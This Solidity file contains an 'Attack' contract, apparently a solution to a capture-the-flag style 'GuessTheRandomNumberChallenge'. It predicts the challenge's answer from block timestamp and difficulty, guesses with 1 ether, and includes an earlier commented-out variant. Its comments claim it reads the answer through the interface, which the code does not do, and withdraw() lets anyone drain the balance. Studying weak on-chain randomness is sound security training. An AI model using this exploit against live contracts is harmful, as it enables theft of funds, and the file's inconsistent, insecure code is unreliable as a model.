// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for the GuessTheRandomNumberChallenge contract
interface IGuessTheRandomNumberChallenge {
    function answer() external view returns (uint8);

    function guess(uint8 n) external payable;
}

// Takes the address of the GuessTheRandomNumberChallenge contract as an input to its constructor.
// It uses an interface to read the answer from the target contract and call the guess function with the correct answer.
// The attacker can withdraw any balance from the contract after a successful attack by calling the withdraw function.
contract Attack {
    IGuessTheRandomNumberChallenge public guessTheRandomNumberChallenge;

    constructor(address _guessTheRandomNumberChallengeAddress) {
        guessTheRandomNumberChallenge = IGuessTheRandomNumberChallenge(
            _guessTheRandomNumberChallengeAddress
        );
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send 1 ether to perform the attack");

        // Calculate the answer using the same logic as in the GuessTheRandomNumberChallenge contract
        uint8 answer = uint8(
            uint256(
                keccak256(abi.encodePacked(block.timestamp, block.difficulty))
            ) % 10
        );

        // Call the guess function with the correct answer
        guessTheRandomNumberChallenge.guess{value: 1 ether}(answer);
    }

    // Withdraw the balance from the Attack contract after a successful attack
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// pragma solidity ^0.8.0;

// import "./GuessTheRandomNumberChallenge.sol";

// contract Attack {
//     GuessTheRandomNumberChallenge public challenge;

//     event AttackSuccessful(uint256 guessedNumber);

//     constructor(address challengeAddress) {
//         challenge = GuessTheRandomNumberChallenge(challengeAddress);
//     }

//     function attack() external payable {
//         require(msg.value == 1 ether, "Send 1 ether to perform the attack");

//         uint256 guessedNumber = uint256(
//             keccak256(abi.encodePacked(block.timestamp))
//         ) % 10;
//         challenge.guess{value: 1 ether}(guessedNumber);
//         emit AttackSuccessful(guessedNumber);
//     }
// }
